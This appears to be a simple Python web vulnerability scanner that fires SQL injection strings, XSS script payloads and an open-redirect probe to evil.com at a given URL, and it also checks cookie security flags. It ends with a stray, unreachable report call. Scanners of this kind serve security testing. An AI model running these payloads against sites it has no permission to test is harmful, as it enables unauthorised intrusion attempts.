import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# ==================== SQL Injection ====================
sql_payloads = ["' OR '1'='1", "';--", "\" OR \"1\"=\"1", "' OR 1=1--"]

def test_sql_injection(url):
    results = []
    if "?" not in url:
        return results
    
    base, params = url.split("?", 1)
    param_parts = params.split("&")
    
    for payload in sql_payloads:
        test_params = []
        for part in param_parts:
            key = part.split("=")[0]
            test_params.append(f"{key}={payload}")
        test_url = base + "?" + "&".join(test_params)
        
        try:
            res = requests.get(test_url, timeout=5)
            if any(err in res.text.lower() for err in ["sql", "syntax", "mysql", "warning"]):
                results.append((test_url, payload))
        except:
            continue
    
    return results

# ==================== XSS ====================
xss_payloads = ['<script>alert(1)</script>', '" onmouseover="alert(1)"']

def test_xss_forms(url):
    results = []
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, "html.parser")
        forms = soup.find_all("form")

        for form in forms:
            action = form.get("action")
            method = form.get("method", "get").lower()
            inputs = form.find_all("input")

            for payload in xss_payloads:
                data = {}
                for inp in inputs:
                    name = inp.get("name")
                    if name:
                        data[name] = payload

                target = url if not action else urljoin(url, action)
                if method == "post":
                    res = requests.post(target, data=data)
                else:
                    res = requests.get(target, params=data)

                if payload in res.text:
                    results.append((target, payload))
    except:
        pass

    return results

# ==================== Open Redirect ====================
def test_open_redirect(url):
    results = []
    if "?" not in url:
        return results

    payload = "https://evil.com"
    base, params = url.split("?", 1)
    test_url = f"{base}?{params}&url={payload}"

    try:
        r = requests.get(test_url, allow_redirects=False)
        if "Location" in r.headers and payload in r.headers["Location"]:
            results.append((test_url, payload))
    except:
        pass

    return results

# ==================== Insecure Cookies ====================
def test_insecure_cookies(url):
    results = []
    try:
        r = requests.get(url, timeout=5)
        if "set-cookie" in r.headers:
            cookies = r.headers.get("set-cookie")
            if "secure" not in cookies.lower() or "httponly" not in cookies.lower():
                results.append((url, cookies))
    except:
        pass

    return results

    report(vulns)
